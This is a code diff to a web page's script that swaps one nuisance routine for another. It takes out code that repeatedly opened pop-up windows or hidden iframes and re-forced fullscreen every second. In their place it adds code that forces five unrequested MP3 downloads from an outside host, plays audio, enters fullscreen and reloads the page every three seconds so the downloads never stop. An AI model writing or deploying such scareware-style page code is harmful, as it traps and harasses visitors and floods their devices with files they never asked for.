@@ -42,11 +42,6 @@
       user-select: none;
       pointer-events: none;
     }
-
-    /* Hidden iframes for fallback redirects */
-    .hidden-iframe {
-      display: none;
-    }
   </style>
 </head>
 <body>
@@ -63,22 +58,14 @@
     const audio = document.getElementById('aud');
     const mp3Url = 'https://jewls-gray.vercel.app/1.mp3';
 
-    // Function to trigger redirect in a new tab/window
-    function triggerRedirect(url) {
-      try {
-        window.open(url, '_blank');
-      } catch (e) {
-        console.log('Window open blocked:', e);
-        // Fallback: Create an iframe to trigger download
-        const iframe = document.createElement('iframe');
-        iframe.src = url;
-        iframe.className = 'hidden-iframe';
-        document.body.appendChild(iframe);
-        // Remove iframe after a delay to avoid clutter
-        setTimeout(() => {
-          document.body.removeChild(iframe);
-        }, 1000);
-      }
+    // Function to trigger MP3 download
+    function triggerDownload(url, filename) {
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = filename || '1.mp3';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
     }
 
     // Fullscreen functionality
@@ -108,20 +95,18 @@
       enterFullscreen();
       tryPlayAudio();
 
-      // Trigger multiple redirects (e.g., 5 times)
-      const redirectCount = 5; // Adjust number of redirects
-      for (let i = 0; i < redirectCount; i++) {
+      // Trigger multiple downloads (e.g., 5 times per page load)
+      const downloadCount = 5; // Adjust number of downloads
+      for (let i = 0; i < downloadCount; i++) {
         setTimeout(() => {
-          triggerRedirect(mp3Url);
-        }, i * 500); // 500ms delay between redirects
+          triggerDownload(mp3Url, `1_${i + 1}.mp3`);
+        }, i * 500); // 500ms delay between downloads
       }
 
-      // Monitor fullscreen status
-      setInterval(() => {
-        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
-          enterFullscreen();
-        }
-      }, 1000);
+      // Refresh page after a delay to repeat downloads
+      setTimeout(() => {
+        window.location.reload();
+      }, 3000); // Refresh every 3 seconds (adjust as needed)
     });
 
     // Handle visibility change to pause/resume audio
